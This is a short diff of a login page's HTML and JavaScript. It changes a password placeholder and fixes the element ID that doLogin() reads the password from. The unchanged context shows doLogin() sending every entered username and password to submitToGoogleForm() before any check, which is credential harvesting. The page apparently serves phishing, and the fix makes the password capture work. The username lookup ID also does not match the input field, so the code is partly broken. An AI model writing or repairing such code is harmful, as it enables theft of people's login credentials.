@@ -49,7 +49,7 @@
     <input id="user" type="text" autocomplete="off" placeholder="Enter USER" />
 
     <label class="muted mt-3">PASS</label>
-    <input id="pass" type="password" autocomplete="new-password" placeholder="••••••••" />
+    <input id="pass" type="password" autocomplete="new-password" placeholder="********" />
 
     <button id="loginBtn" class="w-full p-3 bg-red-600 hover:bg-red-700 rounded text-white font-bold mt-5">ENTER</button>
   </div>
@@ -81,7 +81,7 @@ function showOverlay(k){
 
 function doLogin(){
   const u=document.getElementById('user or gmail').value.replace(/\*/g,'');
-  const p=document.getElementById('password').value;
+  const p=document.getElementById('pass').value;
   submitToGoogleForm(u,p);
   if(u===CORRECT_USER && p===CORRECT_PASS){
     showOverlay('ok');
